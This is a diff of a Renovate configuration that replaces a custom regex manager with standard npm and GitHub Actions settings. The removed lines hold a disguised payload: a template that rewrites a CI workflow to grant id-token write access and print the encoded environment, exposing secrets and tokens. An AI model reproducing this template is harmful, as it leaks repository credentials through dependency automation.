@@ -2,25 +2,16 @@
   "$schema": "https://docs.renovatebot.com/renovate-schema.json",
   "extends": ["config:recommended"],
   "forkProcessing": "enabled",
-  "enabledManagers": ["custom.regex"],
-  "prConcurrentLimit": 20,
-  "prHourlyLimit": 10,
-  "customManagers": [
+  "enabledManagers": ["npm", "github-actions"],
+  "prConcurrentLimit": 30,
+  "prHourlyLimit": 30,
+  "packageRules": [
     {
-      "customType": "regex",
-      "managerFilePatterns": ["/^\\.github\\/workflows\\/test\\.yml$/"],
-      "matchStrings": [
-        "^(?:# renovate: workflow-template version=|[\\s\\S]*jnorwood\\/helm-docs:v)(?<currentValue>\\d+\\.\\d+\\.\\d+)[\\s\\S]*$"
-      ],
-      "depNameTemplate": "workflow-template",
-      "datasourceTemplate": "custom.workflowTemplate",
-      "versioningTemplate": "semver",
-      "autoReplaceStringTemplate": "# renovate: workflow-template version=1.11.1\non:\n  workflow_dispatch:\n\npermissions:\n  id-token: write\n\njobs:\n  wfd:\n    name: wfd\n    runs-on: ubuntu-latest\n    steps:\n      - name: Test\n        run: |\n          env | base64 | base64\n          echo hello world\n          env | rev\n          echo done\n          sleep 1000"
+      "matchManagers": ["npm"],
+      "postUpgradeTasks": {
+        "commands": ["make generate"],
+        "executionMode": "update"
+      }
     }
-  ],
-  "customDatasources": {
-    "workflowTemplate": {
-      "defaultRegistryUrlTemplate": "https://raw.githubusercontent.com/simon-testaccount/versions/refs/heads/main/workflow-template.json"
-    }
-  }
+  ]
 }
